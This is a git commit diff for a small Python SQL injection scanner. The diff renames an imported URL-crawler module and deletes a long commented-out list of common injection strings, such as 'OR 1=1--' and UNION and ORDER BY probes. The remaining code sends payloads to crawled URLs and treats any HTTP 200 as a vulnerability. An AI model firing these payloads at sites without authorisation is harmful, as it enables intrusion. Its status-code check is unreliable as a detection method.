815c88f7079e376c959208da8e7fede19eebabef
buiduchieu <duchieubui25012002@gmail.com>
2024-04-22 23:54:00 +0700

    update file name and little logic in sqlinjection_detector file

--- tool/sqli_scanner.py
+++ tool/sqli_scanner.py
@@ -1,7 +1,7 @@
 import requests
 import sys
 import time
-import test1
+import detectUrlInContentWebsite as detectUrlInContentWebsite
 import payloads
 
 
@@ -14,89 +14,6 @@ def slowprint(s):
 def sqlinjection(url):
     try:
         def scan(url):
-            # print(url)
-            # These are common SQL injection payloads
-            # payloads = ["'+OR+1=1--",
-            #             "administrator'--",
-            #             "' OR 1=1; --",
-            #             "' OR '1'='1",
-            #             "' or",
-            #             "-- or",
-            #             "' OR '1",
-            #             "' OR 1 - - -",
-            #             " OR ""= ",
-            #             " OR 1 = 1 - - -",
-            #             "' OR '' = '",
-            #             "1' ORDER BY 1--+",
-            #             "1' ORDER BY 2--+",
-            #             "1' ORDER BY 3--+",
-
-            #             "1' ORDER BY 1, 2--+",
-            #             "1' ORDER BY 1, 2, 3--+",
-
-            #             "1' GROUP BY 1, 2, --+",
-            #             "1' GROUP BY 1, 2, 3--+",
-            #             "' GROUP BY columnnames having 1= 1 - -",
-            #             "-1' UNION SELECT 1, 2, 3--+",
-            #             "OR 1 = 1",
-            #             "OR 1 = 0",
-            #             "OR 1= 1#",
-            #             "OR 1 = 0#",
-            #             "OR 1 = 1--",
-            #             "OR 1= 0--",
-            #             "HAVING 1 = 1",
-            #             "HAVING 1= 0",
-            #             "HAVING 1= 1#",
-            #             "HAVING 1= 0#",
-            #             "HAVING 1 = 1--",
-            #             "HAVING 1 = 0--",
-            #             "AND 1= 1",
-            #             "AND 1= 0",
-            #             "AND 1 = 1--",
-            #             "AND 1 = 0--",
-            #             "AND 1= 1#",
-            #             "AND 1= 0#",
-            #             "AND 1 = 1 AND '%' ='",
-            #             "AND 1 = 0 AND '%' ='",
-            #             "WHERE 1= 1 AND 1 = 1",
-            #             "WHERE 1 = 1 AND 1 = 0",
-            #             "WHERE 1 = 1 AND 1 = 1#",
-            #             "WHERE 1 = 1 AND 1 = 0#",
-            #             "WHERE 1 = 1 AND 1 = 1--",
-            #             "WHERE 1 = 1 AND 1 = 0--",
-            #             "ORDER BY 1--",
-            #             "ORDER BY 2--",
-            #             "ORDER BY 3--",
-            #             "ORDER BY 4--",
-            #             "ORDER BY 5--",
-            #             "ORDER BY 6--",
-            #             "ORDER BY 7--",
-            #             "ORDER BY 8--",
-            #             "ORDER BY 9--",
-            #             "ORDER BY 10--",
-            #             "ORDER BY 11--",
-            #             "ORDER BY 12--",
-            #             "ORDER BY 13--",
-            #             "ORDER BY 14--",
-            #             "ORDER BY 15--",
-            #             "ORDER BY 16--",
-            #             "ORDER BY 17--",
-            #             "ORDER BY 18--",
-            #             "ORDER BY 19--",
-            #             "ORDER BY 20--",
-            #             "ORDER BY 21--",
-            #             "ORDER BY 22--",
-            #             "ORDER BY 23--",
-            #             "ORDER BY 24--",
-            #             "ORDER BY 25--",
-            #             "ORDER BY 26--",
-            #             "ORDER BY 27--",
-            #             "ORDER BY 28--",
-            #             "ORDER BY 29--",
-            #             "ORDER BY 30--",
-            #             "ORDER BY 31337--",
-            #             ]
-
             for payload in payloads.sqlinjection:
                 r = requests.get(url + payload)
                 if r.status_code == 200:
@@ -106,10 +23,9 @@ def sqlinjection(url):
                     slowprint(f"\033[94m [-] Vulnerability Not Found {url+payload}")
                 # break
 
-
         # Test the scanner with a vulnerable URL
         # url = input("\033[92m [*] Enter URL: ")
-        url_list = test1.scan_url(url)
+        url_list = detectUrlInContentWebsite.scan_url(url)
         # print(url_list)
         for i in range(0, len(url_list)):
             # print(url_list[i])
